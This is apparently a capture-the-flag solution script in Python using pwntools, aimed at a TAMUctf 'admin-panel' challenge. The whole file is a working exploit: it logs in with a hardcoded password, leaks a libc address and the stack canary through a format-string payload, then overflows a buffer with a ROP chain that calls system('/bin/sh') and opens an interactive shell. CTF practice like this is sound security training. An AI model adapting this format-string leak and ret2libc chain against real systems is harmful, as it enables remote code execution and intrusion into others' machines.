from pwn import *

libc = ELF("./libc.so.6")

p = remote("tamuctf.com", 443, ssl=True, sni="admin-panel")

p.sendline(b'admin')

payload  = b'secretpass123'
payload += b'A'*19
payload += b'%7$p.%15$p'

p.sendline(payload)

p.recvuntil(b'Username entered: admin\n')
leak = p.recvline().split(b'.')
libc.address = int(leak[0], 16) - 0xa2995
canary       = int(leak[1], 16)
print(f"libc.address = {hex(libc.address)}")
print(f"canary       = {hex(canary)}")

p.sendline(b'2')

rop_pop_rdi = libc.address + 0x23a5f
rop_ret     = rop_pop_rdi + 1
binsh       = next(libc.search(b'/bin/sh\0'))
system      = libc.sym.system

payload  = b'A'*72
payload += p64(canary)
payload += b'A'*8
payload += p64(rop_pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)

p.sendline(b'3')

p.interactive()
